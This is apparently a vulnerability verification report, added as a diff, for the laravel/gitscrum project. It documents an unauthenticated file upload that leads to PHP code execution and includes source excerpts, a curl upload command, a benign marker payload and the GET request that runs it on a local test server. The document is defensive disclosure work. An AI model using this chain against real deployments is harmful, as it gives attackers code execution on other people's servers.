@@ -1,0 +1,64 @@
+GITSCRUM-01 — verification evidence
+Verdict: VERIFIED (unauthenticated arbitrary file upload -> remote code execution, reproduced)
+
+Environment
+- laravel/gitscrum (gitscrum, ~2909 stars; Laravel framework 5.5.x per composer.lock)
+- Working copy of repos/laravel-gitscrum installed in a temp workspace
+- MySQL 8.0.39 temp instance, 127.0.0.1:3307 (58 migrations applied); served with PHP 8.4.26
+  built-in server, docroot public/, router server.php (standard Laravel router — the repo does
+  not ship one; added only as harness, contains no app logic)
+- Runtime compat shims (vendor-only, PHP 8.4 runtime vs Laravel 5.5-era dependencies; NONE touch
+  application code or the vulnerable path):
+    1. Illuminate Foundation HandleExceptions::handleError — do not convert E_DEPRECATED to exceptions
+    2. Illuminate Foundation PackageManifest::build — unwrap Composer 2 installed.json {"packages": [...]}
+    3. Doctrine DBAL driver PDOConnection/ResultStatement/PDOStatement signatures made PHP 8.4-compatible
+       (PDOConnection no longer implements Driver\Connection — DBAL is unused by the tested path)
+    4. Symfony http-foundation FileBag — strip PHP 8.4's new $_FILES "full_path" entry so upload
+       conversion keeps working (5-key vs 6-key array comparison)
+    5. nesbot/carbon — guard DateTime::getLastErrors() false return (PHP >= 8.2 behaviour)
+
+1) Route/middleware facts (source + artisan route:list)
+- routes/web.php:110-113:
+      Route::group(['prefix' => 'attachments'], function () {
+          Route::get('/--------', 'Web\AttachmentController@store')->name('attachments.show');
+          Route::post('/store', 'Web\AttachmentController@store')->name('attachments.store');
+      });
+  The group carries NO 'user.authenticated' middleware (other groups in the same file do).
+- artisan route:list (live):
+      | POST | attachments/store | attachments.store |
+        | GitScrum\Http\Controllers\Web\AttachmentController@store | web |
+  Middleware = web only. app/Http/Kernel.php 'web' group = AddQueuedCookiesToResponse,
+  StartSession, ShareErrorsFromSession, SubstituteBindings — NO VerifyCsrfToken, and
+  app/Http/Middleware/ contains no VerifyCsrfToken class at all (CSRF protection removed app-wide).
+- app/Http/Requests/AttachmentRequest.php: authorize() returns true; rules = ['attachment' => 'required']
+  — no mimes/extension/size whitelist.
+- app/Services/AttachmentService.php:19,30:
+      $attachmentName = time().'.'.$request->attachment->getClientOriginalExtension();
+      $request->attachment->move($this->getAttachmentFolder(), $attachmentName);  // public_path('attachments')
+  Client-controlled extension concatenated into the public web root; no sanitisation.
+
+2) Dynamic reproduction (no session cookie, no credentials, no CSRF token at any step)
+- Payload (harmless marker only, no system/exec):
+      <?php echo "GITSCRUM-01-TEST-".md5("poc");
+- Upload: curl -F "attachment=@poc.php" http://127.0.0.1:8091/attachments/store
+  -> server writes public/attachments/1790538056.php  (time().'.php' — extension preserved verbatim)
+- Execute: GET http://127.0.0.1:8091/attachments/1790538056.php -> HTTP 200, body:
+      GITSCRUM-01-TEST-302fac1d6d73cf4fdf2c9919195df864
+  where md5("poc") = 302fac1d6d73cf4fdf2c9919195df864 — exact match: attacker-supplied PHP ran
+  under the web server's docroot.
+- The upload POST answered HTTP 500 AFTER the file had already been written:
+  storage/logs/laravel.log shows AttachmentObserver throwing "Attempt to read property id on null"
+  (Auth::user() is null because the request is UNAUTHENTICATED). This both confirms the absence of
+  an auth gate (the request reached the observer with no session) and demonstrates the executable
+  file persists on disk regardless of the post-storage error. With any authenticated account the
+  same request returns the success redirect; the RCE itself requires no account.
+
+3) Chain summary
+POST /attachments/store (no auth, no CSRF)
+  -> AttachmentRequest passes (attachment=required only)
+  -> AttachmentService::upload: time().'.'.getClientOriginalExtension() -> public_path('attachments')
+  -> GET /attachments/<unix_timestamp>.php -> PHP code execution as web user
+Any extension the client sends is kept (.php, .phtml, ...); only the filename prefix (unix time)
+is server-controlled, so shells are trivially locatable by timestamp.
+
+Cleanup: temp mysqld (port 3307) shut down, temp datadir and working copy deleted, php -S stopped.
